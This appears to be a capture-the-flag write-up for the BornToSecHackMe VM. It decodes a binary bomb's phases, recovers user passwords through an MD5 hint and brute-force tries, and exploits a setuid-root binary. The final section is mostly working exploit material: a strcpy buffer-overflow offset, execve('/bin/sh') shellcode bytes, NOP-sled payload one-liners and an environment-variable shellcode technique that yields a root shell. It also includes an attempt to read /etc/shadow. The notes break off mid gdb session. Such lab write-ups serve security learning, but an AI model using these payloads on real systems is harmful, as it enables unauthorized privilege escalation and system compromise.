+    int x = func4(nbr - 1);
+    int y = func4(nbr - 2);
+    return x + y;
+}
+
+void phase_4(char *str) {
+    int nbr;
+    l = sscanf(str, "%d", nbr);
+    if (l != 1) {
+        explode_bomb();
+    }
+    if (nbr > 0) {
+        if (func4(nbr) != 55)
+            explode_bomb();
+    }
+    return;
+}
+
+It should be a number between 1 and 9. By recreating this programm and trying each one we find out that 9 is the answer
+9
+
+(gdb) disass phase_5
+Dump of assembler code for function phase_5:
+   0x08048d2c <+0>:     push   %ebp
+   0x08048d2d <+1>:     mov    %esp,%ebp
+   0x08048d2f <+3>:     sub    $0x10,%esp
+   0x08048d32 <+6>:     push   %esi
+   0x08048d33 <+7>:     push   %ebx
+   0x08048d34 <+8>:     mov    0x8(%ebp),%ebx
+   0x08048d37 <+11>:    add    $0xfffffff4,%esp
+   0x08048d3a <+14>:    push   %ebx
+   0x08048d3b <+15>:    call   0x8049018 <string_length>
+   0x08048d40 <+20>:    add    $0x10,%esp
+   0x08048d43 <+23>:    cmp    $0x6,%eax				// len != 6
+   0x08048d46 <+26>:    je     0x8048d4d <phase_5+33>
+   0x08048d48 <+28>:    call   0x80494fc <explode_bomb>
+   0x08048d4d <+33>:    xor    %edx,%edx				// i = 0
+   0x08048d4f <+35>:    lea    -0x8(%ebp),%ecx
+   0x08048d52 <+38>:    mov    $0x804b220,%esi			// key = "isrveawhobpnutfg\260\001"
+   0x08048d57 <+43>:    mov    (%edx,%ebx,1),%al
+   0x08048d5a <+46>:    and    $0xf,%al
+   0x08048d5c <+48>:    movsbl %al,%eax
+   0x08048d5f <+51>:    mov    (%eax,%esi,1),%al
+   0x08048d62 <+54>:    mov    %al,(%edx,%ecx,1)		// str[i] = key[str[i] & 0xf]
+   0x08048d65 <+57>:    inc    %edx					// i++
+   0x08048d66 <+58>:    cmp    $0x5,%edx				// i <= 5
+   0x08048d69 <+61>:    jle    0x8048d57 <phase_5+43>
+   0x08048d6b <+63>:    movb   $0x0,-0x2(%ebp)
+   0x08048d6f <+67>:    add    $0xfffffff8,%esp
+   0x08048d72 <+70>:    push   $0x804980b				// "giants"
+   0x08048d77 <+75>:    lea    -0x8(%ebp),%eax
+   0x08048d7a <+78>:    push   %eax
+   0x08048d7b <+79>:    call   0x8049030 <strings_not_equal>
+   0x08048d80 <+84>:    add    $0x10,%esp
+   0x08048d83 <+87>:    test   %eax,%eax
+   0x08048d85 <+89>:    je     0x8048d8c <phase_5+96>
+   0x08048d87 <+91>:    call   0x80494fc <explode_bomb>
+   0x08048d8c <+96>:    lea    -0x18(%ebp),%esp
+   0x08048d8f <+99>:    pop    %ebx
+   0x08048d90 <+100>:   pop    %esi
+   0x08048d91 <+101>:   mov    %ebp,%esp
+   0x08048d93 <+103>:   pop    %ebp
+   0x08048d94 <+104>:   ret
+End of assembler dump.
+
+
+
+void phase_5(char *str) {
+    int l = string_length(line);
+    if (l != 6)
+        explode_bomb();
+    i = 0;
+    char *key = "isrveawhobpnutfg"
+    while (i <= 5) {
+        str[i] = key[str[i] & 0xf];
+        i++;
+    }
+    if (strings_not_equal(str, "giants") != 0) {
+        explode_bomb();
+    }
+    return;
+}
+
+opekma
+opukmq
+
+a -> s
+b -> r
+c -> v
+d -> e
+e -> a
+f -> w
+g -> h
+h -> o
+i -> b
+j -> p
+k -> n
+l -> u
+m -> t
+n -> f
+o -> g
+p -> i
+q -> s
+r -> r
+s -> v
+t -> e
+u -> a
+v -> w
+w -> h
+x -> o
+y -> b
+z -> p
+
+
+#include <unistd.h>
+#include <stdio.h>
+int main() {
+        char res[27];
+        char* str = "abcdefghijklmnopqrstuvwxyz\0";
+        int i = 0;
+        char *key = "isrveawhobpnutfg";
+        res[26] = '\0';
+        while (i <= 25) {
+                int idx = str[i] & 0xf;
+                res[i] = key[idx];
+                i++;
+        }
+        printf("%s\n", res);
+        return 0;
+}
+
+abcdefghijklmnopqrstuvwxyz
+srveawhobpnutfgisrveawhobp
+
+
+result: opukmq
+other options: opekma, opukma, opekmq
+
+Another one with several possible options for password. F
+
+
+
+(gdb) disass phase_6
+Dump of assembler code for function phase_6:
+   0x08048d98 <+0>:     push   %ebp
+   0x08048d99 <+1>:     mov    %esp,%ebp
+   0x08048d9b <+3>:     sub    $0x4c,%esp
+   0x08048d9e <+6>:     push   %edi
+   0x08048d9f <+7>:     push   %esi
+   0x08048da0 <+8>:     push   %ebx
+   0x08048da1 <+9>:     mov    0x8(%ebp),%edx
+   0x08048da4 <+12>:    movl   $0x804b26c,-0x34(%ebp)			// node1, 0x34 = 52
+   0x08048dab <+19>:    add    $0xfffffff8,%esp
+   0x08048dae <+22>:    lea    -0x18(%ebp),%eax
+   0x08048db1 <+25>:    push   %eax
+   0x08048db2 <+26>:    push   %edx
+   0x08048db3 <+27>:    call   0x8048fd8 <read_six_numbers>
+   0x08048db8 <+32>:    xor    %edi,%edi
+   0x08048dba <+34>:    add    $0x10,%esp
+   0x08048dbd <+37>:    lea    0x0(%esi),%esi
+   0x08048dc0 <+40>:    lea    -0x18(%ebp),%eax
+   0x08048dc3 <+43>:    mov    (%eax,%edi,4),%eax
+   0x08048dc6 <+46>:    dec    %eax
+   0x08048dc7 <+47>:    cmp    $0x5,%eax
+   0x08048dca <+50>:    jbe    0x8048dd1 <phase_6+57>
+   0x08048dcc <+52>:    call   0x80494fc <explode_bomb>
+   0x08048dd1 <+57>:    lea    0x1(%edi),%ebx
+   0x08048dd4 <+60>:    cmp    $0x5,%ebx
+   0x08048dd7 <+63>:    jg     0x8048dfc <phase_6+100>
+   0x08048dd9 <+65>:    lea    0x0(,%edi,4),%eax
+   0x08048de0 <+72>:    mov    %eax,-0x38(%ebp)
+   0x08048de3 <+75>:    lea    -0x18(%ebp),%esi
+   0x08048de6 <+78>:    mov    -0x38(%ebp),%edx
+   0x08048de9 <+81>:    mov    (%edx,%esi,1),%eax
+   0x08048dec <+84>:    cmp    (%esi,%ebx,4),%eax
+   0x08048def <+87>:    jne    0x8048df6 <phase_6+94>
+   0x08048df1 <+89>:    call   0x80494fc <explode_bomb>
+   0x08048df6 <+94>:    inc    %ebx
+   0x08048df7 <+95>:    cmp    $0x5,%ebx
+   0x08048dfa <+98>:    jle    0x8048de6 <phase_6+78>
+   0x08048dfc <+100>:   inc    %edi
+   0x08048dfd <+101>:   cmp    $0x5,%edi
+   0x08048e00 <+104>:   jle    0x8048dc0 <phase_6+40>
+   0x08048e02 <+106>:   xor    %edi,%edi
+   0x08048e04 <+108>:   lea    -0x18(%ebp),%ecx
+   0x08048e07 <+111>:   lea    -0x30(%ebp),%eax
+   0x08048e0a <+114>:   mov    %eax,-0x3c(%ebp)
+   0x08048e0d <+117>:   lea    0x0(%esi),%esi
+   0x08048e10 <+120>:   mov    -0x34(%ebp),%esi
+   0x08048e13 <+123>:   mov    $0x1,%ebx
+   0x08048e18 <+128>:   lea    0x0(,%edi,4),%eax
+   0x08048e1f <+135>:   mov    %eax,%edx
+   0x08048e21 <+137>:   cmp    (%eax,%ecx,1),%ebx
+   0x08048e24 <+140>:   jge    0x8048e38 <phase_6+160>
+   0x08048e26 <+142>:   mov    (%edx,%ecx,1),%eax
+   0x08048e29 <+145>:   lea    0x0(%esi,%eiz,1),%esi
+   0x08048e30 <+152>:   mov    0x8(%esi),%esi
+   0x08048e33 <+155>:   inc    %ebx
+   0x08048e34 <+156>:   cmp    %eax,%ebx
+   0x08048e36 <+158>:   jl     0x8048e30 <phase_6+152>
+   0x08048e38 <+160>:   mov    -0x3c(%ebp),%edx
+   0x08048e3b <+163>:   mov    %esi,(%edx,%edi,4)
+   0x08048e3e <+166>:   inc    %edi
+   0x08048e3f <+167>:   cmp    $0x5,%edi
+   0x08048e42 <+170>:   jle    0x8048e10 <phase_6+120>
+   0x08048e44 <+172>:   mov    -0x30(%ebp),%esi
+   0x08048e47 <+175>:   mov    %esi,-0x34(%ebp)
+   0x08048e4a <+178>:   mov    $0x1,%edi
+   0x08048e4f <+183>:   lea    -0x30(%ebp),%edx
+   0x08048e52 <+186>:   mov    (%edx,%edi,4),%eax
+   0x08048e55 <+189>:   mov    %eax,0x8(%esi)
+   0x08048e58 <+192>:   mov    %eax,%esi
+   0x08048e5a <+194>:   inc    %edi
+   0x08048e5b <+195>:   cmp    $0x5,%edi
+   0x08048e5e <+198>:   jle    0x8048e52 <phase_6+186>
+   0x08048e60 <+200>:   movl   $0x0,0x8(%esi)
+   0x08048e67 <+207>:   mov    -0x34(%ebp),%esi
+   0x08048e6a <+210>:   xor    %edi,%edi
+   0x08048e6c <+212>:   lea    0x0(%esi,%eiz,1),%esi
+   0x08048e70 <+216>:   mov    0x8(%esi),%edx
+   0x08048e73 <+219>:   mov    (%esi),%eax
+   0x08048e75 <+221>:   cmp    (%edx),%eax
+   0x08048e77 <+223>:   jge    0x8048e7e <phase_6+230>
+   0x08048e79 <+225>:   call   0x80494fc <explode_bomb>
+   0x08048e7e <+230>:   mov    0x8(%esi),%esi
+   0x08048e81 <+233>:   inc    %edi
+   0x08048e82 <+234>:   cmp    $0x4,%edi
+   0x08048e85 <+237>:   jle    0x8048e70 <phase_6+216>
+   0x08048e87 <+239>:   lea    -0x58(%ebp),%esp
+   0x08048e8a <+242>:   pop    %ebx
+   0x08048e8b <+243>:   pop    %esi
+   0x08048e8c <+244>:   pop    %edi
+   0x08048e8d <+245>:   mov    %ebp,%esp
+   0x08048e8f <+247>:   pop    %ebp
+   0x08048e90 <+248>:   ret
+End of assembler dump.
+
+
+(gdb) info var
+All defined variables:
+
+File init.c:
+int _IO_stdin_used;
+
+File bomb.c:
+struct _IO_FILE *infile;
+
+Non-debugging symbols:
+[...]
+0x0804b230  node6				// 432
+0x0804b23c  node5				// 212
+0x0804b248  node4				// 997
+0x0804b254  node3				// 301
+0x0804b260  node2				// 725
+0x0804b26c  node1				// 253
+[...]
+
+
+Phase 6 requires to input 6 numbers. It also sorts 6 global variables and compares the way we input the numbers should be sorted with the default way.
+The clue is 4 and node4 is the biggest so lets sort numbers as:
+4 2 6 3 1 5 
+
+HINT:
+P
+ 2
+ b
+
+o
+4
+
+Final answers:
+1) Public speaking is very easy.  
+2) 1 2 6 24 120 720
+3) 1 b 214 OR 2 b 755 OR 7 b 524
+4) 9
+5) opukmq OR opekma OR opukma OR opekmq
+6) 4 2 6 3 1 5 
+
+
+laurie@BornToSecHackMe:~$ ./bomb
+Welcome this is my little bomb !!!! You have 6 stages with
+only one life good luck !! Have a nice day!
+Public speaking is very easy.
+Phase 1 defused. How about the next one?
+1 2 6 24 120 720
+That's number 2.  Keep going!
+2 b 755
+Halfway there!
+9
+So you got that one.  Try this one.
+opekmq
+Good work!  On to the next...
+4 2 6 3 1 5
+Congratulations! You've defused the bomb!
+
+All these variations work for diffusing the bomb so I quite hate the creators of this challenge right now.
+We will have to try several possible passwords to become thor.
+
+Possible passwords:
+Publicspeakingisveryeasy.126241207201b2149opukmq426315  -> No
+Publicspeakingisveryeasy.126241207201b2149opekma426315  -> No
+Publicspeakingisveryeasy.126241207201b2149opukma426315  -> No
+Publicspeakingisveryeasy.126241207201b2149opekmq426315  -> No
+Publicspeakingisveryeasy.126241207202b7559opukmq426315  -> No
+Publicspeakingisveryeasy.126241207202b7559opekma426315  -> No
+Publicspeakingisveryeasy.126241207202b7559opukma426315  -> No
+Publicspeakingisveryeasy.126241207202b7559opekmq426315  -> No
+Publicspeakingisveryeasy.126241207207b5249opukmq426315  -> No
+Publicspeakingisveryeasy.126241207207b5249opekma426315  -> No
+Publicspeakingisveryeasy.126241207207b5249opukma426315  -> No
+Publicspeakingisveryeasy.126241207207b5249opekmq426315  -> No
+
+After some choice words and googling... There is an error and last numbers in phase 6 should be moved around: 4 2 6 1 3 5
+
+Time to try this once again...
+This worked:
+Publicspeakingisveryeasy.126241207201b2149opekmq426135
+
+The hate lives in me
+
+thor@BornToSecHackMe:~$ ls
+README  turtle
+
+thor@BornToSecHackMe:~$ cat README
+Finish this challenge and use the result as password for 'zaz' user.
+
+Let's hope that this is not another series of reverse-ctf puzzles
+
+
+
+thor@BornToSecHackMe:~$ ./turtle
+./turtle: line 1: Tourne: command not found
+./turtle: line 2: Avance: command not found
+./turtle: line 3: Avance: command not found
+./turtle: line 4: Tourne: command not found
+[...]
+./turtle: line 1468: Avance: command not found
+./turtle: line 1469: Recule: command not found
+./turtle: line 1471: syntax error near unexpected token `)'
+./turtle: line 1471: `Can you digest the message? :)'
+
+cat turtle
+Tourne gauche de 90 degrees
+Avance 50 spaces
+Avance 1 spaces
+Tourne gauche de 1 degrees
+[...]
+Tourne droite de 90 degrees
+Avance 100 spaces
+Recule 200 spaces
+
+Can you digest the message? :)
+
+It is a series of directional steps to draw a picture. Lets write python scipt to see it:
+
+
+
+#! /usr/bin/env python3
+
+from turtle import *
+import os
+import time
+
+file = open(os.path.dirname(os.path.abspath(__file__))+'/turtle', 'r')
+for line in file.readlines():
+    if line == "\n":
+        time.sleep(1)
+        #reset()
+        continue
+    words = line.split()
+    cmd = words[0]
+    if cmd == 'Tourne':
+        n = int(words[3])
+        if words[1] == 'droite':
+            right(n)
+        elif words[1] == 'gauche':
+            left(n)
+    elif cmd == 'Avance':
+        n = int(words[1])
+        forward(n)
+    elif cmd == 'Recule':
+        n = int(words[1])
+        backward(n)
+    else:
+        print(line)
+file.close()
+
+
+
+This piece of modern art spells SLASH and asks "Can you digest the message? :)"
+
+Just SLASH doesn't work for zaz so we have to think some more
+
+MD5 - Passwords are encrypted by the MD5 Message Digest algorithm before they are stored in the directory.
+
+Word "message" in the last line of turtle is a hint fro md5 encryption
+
+646da671ca01bb5d84dbb5fb2238dc8e
+
+
+ ssh zaz@192.168.31.134
+        ____                _______    _____
+       |  _ \              |__   __|  / ____|
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+zaz@192.168.31.134's password:
+zaz@BornToSecHackMe:~$ ls
+exploit_me  mail
+zaz@BornToSecHackMe:~$ ls -la
+total 12
+drwxr-x--- 4 zaz      zaz   147 Oct 15  2015 .
+drwxrwx--x 1 www-data root   60 Oct 13  2015 ..
+-rwxr-x--- 1 zaz      zaz     1 Oct 15  2015 .bash_history
+-rwxr-x--- 1 zaz      zaz   220 Oct  8  2015 .bash_logout
+-rwxr-x--- 1 zaz      zaz  3489 Oct 13  2015 .bashrc
+drwx------ 2 zaz      zaz    43 Oct 14  2015 .cache
+-rwsr-s--- 1 root     zaz  4880 Oct  8  2015 exploit_me
+drwxr-x--- 3 zaz      zaz   107 Oct  8  2015 mail
+-rwxr-x--- 1 zaz      zaz   675 Oct  8  2015 .profile
+-rwxr-x--- 1 zaz      zaz  1342 Oct 15  2015 .viminfo
+
+zaz@BornToSecHackMe:~$ ls mail/
+INBOX.Drafts  INBOX.Sent  INBOX.Trash
+
+zaz@BornToSecHackMe:~$ ./exploit_me aaa
+aaa
+
+zaz@BornToSecHackMe:~$ gdb ./exploit_me
+(gdb) disass main
+Dump of assembler code for function main:
+   0x080483f4 <+0>:     push   %ebp
+   0x080483f5 <+1>:     mov    %esp,%ebp
+   0x080483f7 <+3>:     and    $0xfffffff0,%esp
+   0x080483fa <+6>:     sub    $0x90,%esp				// 0x90 = 144
+   0x08048400 <+12>:    cmpl   $0x1,0x8(%ebp)
+   0x08048404 <+16>:    jg     0x804840d <main+25>		// argc > 1
+   0x08048406 <+18>:    mov    $0x1,%eax
+   0x0804840b <+23>:    jmp    0x8048436 <main+66>
+   0x0804840d <+25>:    mov    0xc(%ebp),%eax			// 0xc = 12
+   0x08048410 <+28>:    add    $0x4,%eax
+   0x08048413 <+31>:    mov    (%eax),%eax
+   0x08048415 <+33>:    mov    %eax,0x4(%esp)
+   0x08048419 <+37>:    lea    0x10(%esp),%eax			// 0x10 = 16
+   0x0804841d <+41>:    mov    %eax,(%esp)
+   0x08048420 <+44>:    call   0x8048300 <strcpy@plt>
+   0x08048425 <+49>:    lea    0x10(%esp),%eax
+   0x08048429 <+53>:    mov    %eax,(%esp)
+   0x0804842c <+56>:    call   0x8048310 <puts@plt>
+   0x08048431 <+61>:    mov    $0x0,%eax
+   0x08048436 <+66>:    leave
+   0x08048437 <+67>:    ret
+End of assembler dump.
+
+
+I'm lazy so 
+
+zaz@BornToSecHackMe:~$ ./exploit_me `cat /etc/passwd`
+root:x:0:0:root:/root:/bin/bash
+zaz@BornToSecHackMe:~$ ./exploit_me `cat /etc/shadow`
+cat: /etc/shadow: Permission denied
+
+Second x means that password is stored in /etc/shadow file
+
+
+
+
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+
+zaz@BornToSecHackMe:~$ gdb ./exploit_me
+(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Starting program: /home/zaz/exploit_me Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37654136 in ?? ()
+
+
+Offset 140
+
+zaz@BornToSecHackMe:~$ ltrace ./exploit_me aaaaaaaaaaaaaa
+__libc_start_main(0x80483f4, 2, 0xbffff7f4, 0x8048440, 0x80484b0 <unfinished ...>
+strcpy(0xbffff6d0, "aaaaaaaaaaaaaa")                                                                      = 0xbffff6d0
+puts("aaaaaaaaaaaaaa"aaaaaaaaaaaaaa
+)                                                                                    = 15
++++ exited (status 0) +++
+
+Input is stored at 0xbffff6d0
+
+
+[shellcode](http://shell-storm.org/shellcode/files/shellcode-827.html):
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+Shellcode for `execve("/bin/sh")` from [here](https://shell-storm.org/shellcode/files/shellcode-575.html):
+"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
+
+
+* 23 bytes -> shellcode
+* 117 bytes (140 - 23) -> padding
+* 4 bytes -> 0xbffff6d0
+
+python -c 'print "\x90" * 50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "a" * 67 + "\xd0\xf6\xff\xbf"'
+
+
+"\x31\xc0\x50\x48\x8b\x14\x24\xeb\x10\x54\x78\x06\x5e\x5f\xb0\x3b\x0f\x05\x59\x5b\x40\xb0\x0b\xcd\x80\xe8\xeb\xff\xff\xff/bin/sh"
+`python -c 'print "\x90" * 50 + "\x31\xc0\x50\x48\x8b\x14\x24\xeb\x10\x54\x78\x06\x5e\x5f\xb0\x3b\x0f\x05\x59\x5b\x40\xb0\x0b\xcd\x80\xe8\xeb\xff\xff\xff/bin/sh" + "a" * 52 + "\xd0\xf6\xff\xbf"'`
+
+
+
+saving shellcode in buffer doesn't work so env variable:
+
+zaz@BornToSecHackMe:~$ export SHELLCODE=`python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`
+zaz@BornToSecHackMe:~$ gdb ./exploit_me
+(gdb) b main
+Breakpoint 1 at 0x80483f7
+(gdb) r
+Starting program: /home/zaz/exploit_me
+
+Breakpoint 1, 0x080483f7 in main ()
+(gdb) x/10s *((char**)environ)
+0xbffff8d5:      "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343PS\211\341\260\v̀"
+0xbffff929:      "SHELL=/bin/bash"
+0xbffff939:      "TERM=xterm-256color"
+0xbffff94d:      "SSH_CLIENT=192.168.31.1 61936 22"
+0xbffff96e:      "SSH_TTY=/dev/pts/0"
+0xbffff981:      "USER=zaz"
+0xbffff98a:      "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31"...
+0xbffffa52:      ":*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.d"...
+0xbffffb1a:      "eb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35"...
+0xbffffbe2:      ":*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mk"...
+
+
+0xbffff8d5 -> /xd5/xf8/xff/xbf
+
+(gdb) x /150xg 0xbffff8d5
+0xbffff8d5:     0x444f434c4c454853      0x9090909090903d45
+0xbffff8e5:     0x9090909090909090      0x9090909090909090
+0xbffff8f5:     0x9090909090909090      0x9090909090909090
+0xbffff905:     0x9090909090909090      0x6850c03190909090
+0xbffff915:     0x69622f6868732f2f      0xb0e1895350e3896e
+0xbffff925:     0x4c4548530080cd0b      0x622f6e69622f3d4c
+0xbffff935:     0x4d52455400687361      0x322d6d726574783d
+
+
+
+Address in nop sled
+0xbffff8f5 -> /xf5/xf8/xff/xbf
+
+`python -c 'print "A" * 140 + "/xdf/xf8/xff/xbf"`
+
+
+0xbffff8c7 
+
+0xbffff8e7   `python -c 'print "A" * 140 + "/xe7/xf8/xff/xbf"'`
+
+
+it doesn't work :(
+
+
+
+
+zaz@BornToSecHackMe:~$ export SHELLCODE=`python -c 'print "\x90" * 900 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'`
+zaz@BornToSecHackMe:~$ gdb ./exploit_me
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
+(gdb) b main
+Breakpoint 1 at 0x80483f7
+(gdb) r
+Starting program: /home/zaz/exploit_me
+
+Breakpoint 1, 0x080483f7 in main ()
+(gdb) x/s *((char **)environ+0)
+0xbffff56d:      "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
+(gdb) x/150xg 0xbffff56d
+0xbffff56d:     0x444f434c4c454853      0x9090909090903d45
+0xbffff57d:     0x9090909090909090      0x9090909090909090
+0xbffff58d:     0x9090909090909090      0x9090909090909090
+0xbffff59d:     0x9090909090909090      0x9090909090909090
+0xbffff5ad:     0x9090909090909090      0x9090909090909090
+0xbffff5bd:     0x9090909090909090      0x9090909090909090
+0xbffff5cd:     0x9090909090909090      0x9090909090909090
+0xbffff5dd:     0x9090909090909090      0x9090909090909090
+0xbffff5ed:     0x9090909090909090      0x9090909090909090
+0xbffff5fd:     0x9090909090909090      0x9090909090909090
+0xbffff60d:     0x9090909090909090      0x9090909090909090
+0xbffff61d:     0x9090909090909090      0x9090909090909090
+0xbffff62d:     0x9090909090909090      0x9090909090909090
+0xbffff63d:     0x9090909090909090      0x9090909090909090
+0xbffff64d:     0x9090909090909090      0x9090909090909090
+0xbffff65d:     0x9090909090909090      0x9090909090909090
+0xbffff66d:     0x9090909090909090      0x9090909090909090
+0xbffff67d:     0x9090909090909090      0x9090909090909090
+0xbffff68d:     0x9090909090909090      0x9090909090909090
+0xbffff69d:     0x9090909090909090      0x9090909090909090
+0xbffff6ad:     0x9090909090909090      0x9090909090909090
+0xbffff6bd:     0x9090909090909090      0x9090909090909090
+0xbffff6cd:     0x9090909090909090      0x9090909090909090
+0xbffff6dd:     0x9090909090909090      0x9090909090909090
+0xbffff6ed:     0x9090909090909090      0x9090909090909090
+0xbffff6fd:     0x9090909090909090      0x9090909090909090
+0xbffff70d:     0x9090909090909090      0x9090909090909090
+0xbffff71d:     0x9090909090909090      0x9090909090909090
+0xbffff72d:     0x9090909090909090      0x9090909090909090
+0xbffff73d:     0x9090909090909090      0x9090909090909090
+0xbffff74d:     0x9090909090909090      0x9090909090909090
+0xbffff75d:     0x9090909090909090      0x9090909090909090
+0xbffff76d:     0x9090909090909090      0x9090909090909090
+0xbffff77d:     0x9090909090909090      0x9090909090909090
+0xbffff78d:     0x9090909090909090      0x9090909090909090
+0xbffff79d:     0x9090909090909090      0x9090909090909090
+0xbffff7ad:     0x9090909090909090      0x9090909090909090
+0xbffff7bd:     0x9090909090909090      0x9090909090909090
+0xbffff7cd:     0x9090909090909090      0x9090909090909090
+---Type <return> to continue, or q <return> to quit---q
+Quit
+(gdb) q
+A debugging session is active.
+
+        Inferior 1 [process 2630] will be killed.
+
+Quit anyway? (y or n) y
+zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print "i"*140 + "\x3d\xf7\xff\xbf"')
+iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii=   
+#
+
+
+
+0xbffff8ef
+$(python -c 'print "i"*140 + "\xbf\xf8\xff\xbf"')
+
+
+zaz@BornToSecHackMe:~$ export SHELLCODE=`python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`
+zaz@BornToSecHackMe:~$ gdb ./exploit_me
+(gdb) b main
+Breakpoint 1 at 0x80483f7
+(gdb) r
+Starting program: /home/zaz/exploit_me
+
+Breakpoint 1, 0x080483f7 in main ()
+(gdb) x/s *((char **)environ+0)
